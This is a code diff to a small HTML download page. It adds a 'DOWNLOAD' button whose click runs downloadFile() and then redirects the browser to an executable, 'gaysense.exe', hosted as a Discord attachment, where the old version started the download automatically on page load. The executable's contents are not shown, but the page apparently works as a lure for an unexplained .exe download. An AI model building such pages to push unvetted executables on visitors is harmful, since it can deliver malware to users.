@@ -12,6 +12,17 @@
 			background-position: center center;
 			background-repeat: no-repeat;
 		}
+		.button {
+			display: block;
+			margin: 0 auto;
+			padding: 10px 20px;
+			background-color: #fff;
+			color: #000;
+			font-size: 24px;
+			text-align: center;
+			border-radius: 10px;
+			cursor: pointer;
+		}
 	</style>
 	<script>
 		function downloadFile() {
@@ -30,9 +41,14 @@
 			xhr.open('GET', url);
 			xhr.send();
 		}
+
+		function redirect() {
+			window.location.href = "https://cdn.discordapp.com/attachments/819248797720903702/1102171272256962620/gaysense.exe"; // Replace with the URL of the website you want to redirect to
+		}
 	</script>
 </head>
-<body onload="downloadFile()">
+<body>
+	<button class="button" onclick="downloadFile();redirect();">DOWNLOAD</button>
 	<audio autoplay loop>
 		<source src="https://cdn.discordapp.com/attachments/1090643107529379860/1100480747292336178/coolsong.mp3" type="audio/mp3"> <!-- Replace with the URL of your background music -->
 	</audio>
